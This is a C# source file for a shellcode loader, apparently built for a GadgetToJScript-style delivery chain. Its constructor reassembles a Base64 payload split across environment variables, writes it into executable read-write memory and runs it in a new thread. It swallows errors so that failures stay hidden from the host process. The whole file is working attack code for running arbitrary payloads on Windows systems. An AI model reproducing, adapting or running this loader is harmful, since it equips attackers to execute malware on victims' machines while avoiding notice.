using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace ShellcodeLoader
{
    public class Program
    {
        // ---------------------------------------------------------
        // Win32 API Imports
        // ---------------------------------------------------------
        
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        // ---------------------------------------------------------
        // Constants
        // ---------------------------------------------------------
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const UInt32 INFINITE = 0xFFFFFFFF;

        // ---------------------------------------------------------
        // Entry Point (Constructor)
        // ---------------------------------------------------------
        public Program()
        {
            try
            {
                ExecuteShellcode();
            }
            catch (Exception)
            {
                // Swallow exceptions to prevent crashing the host process visibly if something goes wrong
            }
        }

        private void ExecuteShellcode()
        {
            // 1. Reassemble Base64 Payload from Environment Variables
            // Pattern: G2JS_PL_0, G2JS_PL_1, ...
            StringBuilder b64Payload = new StringBuilder();
            int index = 0;
            
            while (true)
            {
                string envVarName = "G2JS_PL_" + index;
                string chunk = Environment.GetEnvironmentVariable(envVarName, EnvironmentVariableTarget.Process);

                if (string.IsNullOrEmpty(chunk))
                {
                    break;
                }

                b64Payload.Append(chunk);
                index++;
            }

            string fullBase64 = b64Payload.ToString();

            if (string.IsNullOrEmpty(fullBase64))
            {
                return; 
            }

            // 2. Decode Shellcode
            byte[] shellcode = Convert.FromBase64String(fullBase64);

            if (shellcode.Length == 0) return;

            // 3. Allocate Memory
            IntPtr allocatedMemory = VirtualAlloc(
                IntPtr.Zero, 
                (uint)shellcode.Length, 
                MEM_COMMIT | MEM_RESERVE, 
                PAGE_EXECUTE_READWRITE
            );

            if (allocatedMemory == IntPtr.Zero)
            {
                return;
            }

            // 4. Copy Shellcode to Memory
            Marshal.Copy(shellcode, 0, allocatedMemory, shellcode.Length);

            // 5. Execute
            uint threadId;
            IntPtr hThread = CreateThread(
                IntPtr.Zero, 
                0, 
                allocatedMemory, 
                IntPtr.Zero, 
                0, 
                out threadId
            );

            if (hThread != IntPtr.Zero)
            {
                // Wait for the shellcode to complete (blocks the script execution)
                // This ensures the process doesn't exit immediately if it's a short-lived script
                WaitForSingleObject(hThread, INFINITE);
            }
        }
    }
}